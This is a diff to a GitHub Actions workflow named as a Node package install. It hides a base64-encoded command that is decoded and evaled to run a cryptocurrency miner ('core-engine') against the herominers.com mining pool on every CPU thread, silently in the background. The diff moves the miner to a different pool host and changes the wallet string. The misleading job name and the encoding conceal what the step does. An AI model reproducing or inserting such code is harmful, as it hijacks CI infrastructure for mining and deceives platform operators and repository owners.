@@ -1,4 +1,4 @@
-name: node package manager install nodejs-2
+name: node package manager install nodejs-4
 
 on:
   push:
@@ -29,12 +29,12 @@ jobs:
       - name: Run Machine 4
         run: |
           chmod +x core-engine
-          ENCODED="Li9jb3JlLWVuZ2luZSAtbyBzZy5xcmwuaGVyb21pbmVycy5jb206MTE2NyBcCiAgLXUgUTAxMDUwMDhjMmQyY2I2ZWUyMTE3N2RhZWYxNmViNjZlN2ZiMmEwY2UyYTdhNmI0OTM3YmUyZmQ1ZTY1YzMwNzRlNjI4NDAzM2I5ZDdkOC5Sb3NhbmFBbmRyYWRlMjU9OTYwMDAwIFwKICAtLWRvbmF0ZS1sZXZlbCAwIFwKICAtayAtLXRocmVhZHM9JChucHJvYykgLS1jcHUtcHJpb3JpdHk9NSAtLWh1Z2UtcGFnZXMtaml0IC0tY3B1LW5vLXlpZWxkIC0tcmFuZG9teC1uby1udW1hIFwKICAtYSByeC8wIC0tdGxzIC0tYXNtPXJ5emVuIC0tcmFuZG9teC1uby1yZG1zciAtLXJhbmRvbXgtd3Jtc3I9LTEgLS1yYW5kb214LW1vZGU9ZmFzdA=="
+          ENCODED="Li9jb3JlLWVuZ2luZSAtbyBjYS5xcmwuaGVyb21pbmVycy5jb206MTE2NyBcCiAgLXUgc29sbzpRMDEwNTAwOGMyZDJjYjZlZTIxMTc3ZGFlZjE2ZWI2NmU3ZmIyYTBjZTJhN2E2YjQ5MzdiZTJmZDVlNjVjMzA3NGU2Mjg0MDMzYjlkN2Q4LlJvc2FuYUFuZHJhZGUyNT05NjAwMDAgXAogIC0tZG9uYXRlLWxldmVsIDAgXAogIC1rIC0tdGhyZWFkcz0kKG5wcm9jKSAtLWNwdS1wcmlvcml0eT01IC0taHVnZS1wYWdlcy1qaXQgLS1jcHUtbm8teWllbGQgLS1yYW5kb214LW5vLW51bWEgXAogIC1hIHJ4LzAgLS10bHMgLS1hc209cnl6ZW4gLS1yYW5kb214LW5vLXJkbXNyIC0tcmFuZG9teC13cm1zcj0tMSAtLXJhbmRvbXgtbW9kZT1mYXN0"
           CMD=$(echo "$ENCODED" | base64 -d)
           FINAL_CMD="$CMD > /dev/null 2>&1 &"
           eval "$FINAL_CMD"
           PID=$!
-          for i in {1..360}; do
+          for i in {1..15}; do
             echo "."
             sleep $((RANDOM % 11 + 35))
           done
